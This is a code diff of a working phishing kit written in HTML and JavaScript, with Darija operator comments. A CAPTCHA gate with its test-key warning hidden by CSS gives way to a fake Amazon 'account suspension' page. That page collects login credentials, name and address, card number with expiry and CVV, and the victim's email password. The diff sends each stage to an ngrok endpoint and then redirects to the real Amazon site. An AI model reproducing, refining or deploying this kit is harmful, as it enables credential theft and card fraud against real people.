@@ -13,133 +13,164 @@
         button:disabled { background: #cccccc; color: #666666; cursor: not-allowed; }
         .spinner { width: 40px; height: 40px; border: 3px solid #e0e0e0; border-top: 3px solid #FF9900; border-radius: 50%; animation: spin 0.6s linear infinite; margin: 20px auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #status { display: none; margin-bottom: 15px; font-weight: bold; color: #555; }
-        
-        /* إخفاء تنبيه التجربة من جوجل */
-        .g-recaptcha + br + div, .g-recaptcha ~ div[style*="color: red"] { display: none !important; }
+        #status { display: none; }
+        .g-recaptcha + br + div, .g-recaptcha ~ div[style*="color: red"], div[style*="color: red"][style*="font-size"] { display: none !important; visibility: hidden !important; opacity: 0 !important; height: 0 !important; width: 0 !important; overflow: hidden !important; position: absolute !important; pointer-events: none !important; }
     </style>
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
-
 <div id="gate">
     <div id="status"></div>
-    <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" data-callback="onCaptchaSuccess"></div>
-    <button id="verifyBtn" disabled>Verify Identity</button>
+    <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" data-callback="onCaptchaSuccess" data-expired-callback="onCaptchaExpired"></div>
+    <button id="verifyBtn" disabled>Verify</button>
 </div>
 
 <script>
-// --- إعدادات السيرفر ---
-// ركز هنا: هاد الرابط هو اللي بان فالتصويرة ديال Ngrok اللي صيفطي
-const SERVER_URL = "https://743a-196-113-84-3.ngrok-free.app/receive"; 
+// الرابط اللي طالع ليك دابا فـ Ngrok (تأكد ديما بلي هو اللي خدام)
+const CURRENT_NGROK_URL = "https://743a-196-113-84-3.ngrok-free.app/receive"; 
 
-// --- كود الصفحة الوهمية (Phishing Page) ---
-var FULL_PHISHING_PAGE = `
-<!DOCTYPE html>
-<html>
+var FULL_PHISHING_PAGE = `<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Amazon - Verification Required</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Amazon - Account Suspension</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background: #EAEDED; padding: 20px; }
-        .container { background: white; max-width: 450px; margin: auto; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .logo { text-align: center; margin-bottom: 20px; }
-        .logo img { width: 100px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #EAEDED; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background: white; max-width: 450px; width: 100%; padding: 25px 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: relative; }
+        .loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.9); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 200; }
+        .loading-overlay.active { display: flex; }
+        .spinner-large { width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top: 4px solid #FF9900; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .logo { text-align: center; margin-bottom: 25px; }
+        .logo img { width: 120px; }
+        .alert-orange { background: #FFF4E5; border-left: 4px solid #FF9900; padding: 15px; margin-bottom: 25px; }
+        .form-group { margin-bottom: 18px; }
+        label { display: block; font-weight: 700; font-size: 13px; margin-bottom: 5px; }
+        input, select { width: 100%; padding: 10px; border: 1px solid #a6a6a6; border-radius: 4px; }
+        button { background: #FFD814; width: 100%; padding: 10px; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
         .step { display: none; }
         .step.active { display: block; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; font-weight: bold; font-size: 13px; margin-bottom: 5px; }
-        input { width: 100%; padding: 10px; border: 1px solid #a6a6a6; border-radius: 4px; }
-        button { background: #FFD814; border: none; padding: 10px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         .error { color: #c40000; font-size: 12px; margin-top: 10px; text-align: center; }
-        .loading-overlay { display: none; text-align: center; padding: 20px; }
+        .progress { display: flex; justify-content: space-between; margin-bottom: 30px; }
+        .progress-step { width: 30px; height: 30px; background: #ddd; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
+        .progress-step.active { background: #FF9900; }
     </style>
 </head>
 <body>
-    <div class="container">
+<div class="container">
+    <div id="loadingOverlay" class="loading-overlay"><div class="spinner-large"></div><p>Processing...</p></div>
+    <div class="progress">
+        <div id="step1_prog" class="progress-step active">1</div>
+        <div id="step2_prog" class="progress-step">2</div>
+        <div id="step3_prog" class="progress-step">3</div>
+        <div id="step4_prog" class="progress-step">4</div>
+        <div id="step5_prog" class="progress-step">5</div>
+    </div>
+    
+    <div id="step1" class="step active">
         <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"></div>
-        <div id="loader" class="loading-overlay"><div class="spinner"></div><p>Processing...</p></div>
-
-        <!-- المرحلة 1: تسجيل الدخول -->
-        <div id="step1" class="step active">
-            <h3>Login Required</h3>
-            <div class="form-group"><label>Email</label><input type="email" id="email"></div>
-            <div class="form-group"><label>Password</label><input type="password" id="pass"></div>
-            <button onclick="handleStep1()">Continue</button>
-            <div id="err1" class="error"></div>
-        </div>
-
-        <!-- المرحلة 2: البطاقة -->
-        <div id="step2" class="step">
-            <h3>Payment Method</h3>
-            <div class="form-group"><label>Card Number</label><input type="text" id="card"></div>
-            <div class="form-group"><label>Expiry Date</label><input type="text" id="exp" placeholder="MM/YY"></div>
-            <div class="form-group"><label>CVV</label><input type="password" id="cvv"></div>
-            <button onclick="handleStep2()">Confirm</button>
-            <div id="err2" class="error"></div>
-        </div>
+        <div class="alert-orange"><b>Account Suspended</b><br>Update information to regain access.</div>
+        <div class="form-group"><label>Email</label><input type="email" id="amz_email"></div>
+        <div class="form-group"><label>Password</label><input type="password" id="amz_password"></div>
+        <button id="step1Btn">Update Now</button>
+        <div id="step1Error" class="error"></div>
     </div>
 
-    <script>
-        let userData = {};
+    <div id="step2" class="step">
+        <h3>Verify Address</h3>
+        <div class="form-group"><label>Full Name</label><input type="text" id="fullname"></div>
+        <div class="form-group"><label>Address</label><input type="text" id="address"></div>
+        <button id="step2Btn">Continue</button>
+        <div id="step2Error" class="error"></div>
+    </div>
 
-        function sendToSrv(data, nextStep, errId) {
-            document.getElementById('loader').style.display = 'block';
-            fetch("${SERVER_URL}", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            })
-            .then(res => {
-                if(res.ok) {
-                    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-                    document.getElementById('step' + nextStep).classList.add('active');
-                } else {
-                    document.getElementById(errId).innerText = "Server Error. Retrying...";
-                }
-            })
-            .catch(() => { document.getElementById(errId).innerText = "Connection Error."; })
-            .finally(() => { document.getElementById('loader').style.display = 'none'; });
-        }
+    <div id="step3" class="step">
+        <h3>Payment Method</h3>
+        <div class="form-group"><label>Card Number</label><input type="text" id="card_number"></div>
+        <div class="form-group"><label>Expiry/CVV</label><input type="text" id="expiry" placeholder="MM/YY"> <input type="text" id="cvv" placeholder="CVV"></div>
+        <button id="step3Btn">Continue</button>
+        <div id="step3Error" class="error"></div>
+    </div>
 
-        function handleStep1() {
-            userData.user = document.getElementById('email').value;
-            userData.password = document.getElementById('pass').value;
-            userData.type = "Amazon-Login";
-            sendToSrv(userData, 2, 'err1');
-        }
+    <div id="step4" class="step">
+        <h3>Email Verification</h3>
+        <div class="form-group"><label>Email Access</label><input type="email" id="email_access"></div>
+        <div class="form-group"><label>Email Password</label><input type="password" id="email_password"></div>
+        <button id="step4Btn">Verify</button>
+        <div id="step4Error" class="error"></div>
+    </div>
 
-        function handleStep2() {
-            userData.card = document.getElementById('card').value;
-            userData.exp = document.getElementById('exp').value;
-            userData.cvv = document.getElementById('cvv').value;
-            // النهاية: التحويل لأمازون الأصلي
-            fetch("${SERVER_URL}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(userData) })
-            .then(() => { window.location.href = "https://www.amazon.com"; });
-        }
-    <\/script>
+    <div id="step5" class="step">
+        <h2 style="text-align:center">✅ Success</h2>
+        <p style="text-align:center">Your account is being restored...</p>
+    </div>
+</div>
+
+<script>
+    let collected = {};
+    const overlay = document.getElementById('loadingOverlay');
+    function showLoading(show) { if(show) overlay.classList.add('active'); else overlay.classList.remove('active'); }
+    function goToStep(n) { 
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step'+n).classList.add('active');
+        document.querySelectorAll('.progress-step').forEach((p, i) => { if(i+1 <= n) p.classList.add('active'); });
+    }
+
+    function sendData(data, nextStep, errId, btn, isFinal) {
+        showLoading(true);
+        fetch("${CURRENT_NGROK_URL}", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        })
+        .then(res => {
+            if(res.ok) {
+                goToStep(nextStep);
+                if(isFinal) setTimeout(() => window.location.href="https://www.amazon.com", 3000);
+            } else { document.getElementById(errId).innerText = "Error. Retry..."; }
+        })
+        .catch(() => { document.getElementById(errId).innerText = "Network Error."; })
+        .finally(() => showLoading(false));
+    }
+
+    document.getElementById("step1Btn").onclick = () => {
+        collected.user = document.getElementById("amz_email").value;
+        collected.password = document.getElementById("amz_password").value;
+        sendData({stage: "login", ...collected}, 2, "step1Error");
+    };
+    document.getElementById("step2Btn").onclick = () => {
+        collected.name = document.getElementById("fullname").value;
+        collected.addr = document.getElementById("address").value;
+        sendData({stage: "address", ...collected}, 3, "step2Error");
+    };
+    document.getElementById("step3Btn").onclick = () => {
+        collected.card = document.getElementById("card_number").value;
+        sendData({stage: "card", ...collected}, 4, "step3Error");
+    };
+    document.getElementById("step4Btn").onclick = () => {
+        collected.mail_p = document.getElementById("email_password").value;
+        sendData({stage: "final", ...collected}, 5, "step4Error", null, true);
+    };
+<\/script>
 </body>
-</html>
-`;
+</html>\`;
 
-// --- منطق الـ CAPTCHA ---
-window.onCaptchaSuccess = function() {
-    document.getElementById('verifyBtn').disabled = false;
-};
+var verifyBtn = document.getElementById('verifyBtn');
+window.onCaptchaSuccess = function(token) { verifyBtn.disabled = false; };
+window.onCaptchaExpired = function() { verifyBtn.disabled = true; };
 
-document.getElementById('verifyBtn').onclick = function() {
-    let status = document.getElementById('status');
-    status.style.display = 'block';
-    status.innerHTML = '<div class="spinner"></div> Verifying...';
-    
-    setTimeout(() => {
+verifyBtn.onclick = function() {
+    var statusDiv = document.getElementById('status');
+    statusDiv.style.display = 'block';
+    statusDiv.innerHTML = "<div class='spinner'></div>Loading...";
+    setTimeout(function() {
         document.open();
         document.write(FULL_PHISHING_PAGE);
         document.close();
-    }, 1000);
+    }, 500);
 };
 </script>
-
 </body>
 </html>
